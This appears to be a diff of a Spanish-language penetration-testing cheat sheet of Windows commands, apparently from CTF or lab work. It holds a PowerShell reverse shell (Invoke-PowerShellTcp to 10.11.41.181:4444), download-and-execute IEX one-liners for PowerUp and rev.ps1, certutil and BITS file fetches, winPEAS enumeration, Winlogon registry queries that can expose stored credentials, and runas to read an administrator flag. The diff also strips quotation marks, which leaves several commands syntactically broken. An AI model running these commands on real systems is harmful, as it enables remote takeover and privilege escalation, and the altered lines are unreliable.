@@ -39,11 +39,11 @@ powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).Downl
 powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.41.181:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444"
 
 # Descargas via CLI en windows
-powershell.exe -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
+powershell.exe -c Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'
 IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/powerup.ps1')
 C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/rev.ps1')
 powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
-powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
+powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')
 Invoke-WebRequest -Uri $url -OutFile $dest
 certutil.exe -f -urlcache -split http://ip/file file
 wget URL -UseBasicParsing -OutFile FILE
@@ -53,8 +53,8 @@ Start-BitsTransfer -Source $url -Destination $dest
 c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe
 
 # copiar archivos desde compartida 
-$origen = "\\LA-WIN10-LAB01\speedtest\"
-$destino = "c:\temp\testfiles"
+$origen = \\LA-WIN10-LAB01\speedtest\
+$destino = c:\temp\testfiles
 
 # copiar todos los archivos de la compartida 
 Copy-Item -path $source -Destination $destination -Recurse
@@ -204,3 +204,6 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 # runas
 runas /user:administrator "type C:\Users\Administrator\Desktop\root.txt"
+
+# winpeas
+winPEASx64.exe notcolor -lolbas 2>$null
